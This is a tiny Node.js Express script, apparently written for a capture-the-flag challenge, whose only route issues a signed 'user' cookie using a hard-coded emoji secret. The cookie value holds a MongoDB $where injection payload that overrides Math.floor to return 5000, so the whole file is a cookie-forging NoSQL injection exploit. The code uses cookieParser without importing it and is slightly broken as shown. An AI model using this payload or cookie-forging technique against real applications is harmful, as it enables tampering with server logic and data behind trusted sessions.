const express = require("express");

const app = express();

app.use(cookieParser('🐈' + '🐇'));
app.use(express.urlencoded());

app.get('/test', (req, res) => {
        res.cookie('user', {author: 'byc404', $where: 'Math.floor = function(x) { return 5000; }; return 0;'}, {signed: true});
        res.send('');
});

app.listen(8081, '0.0.0.0');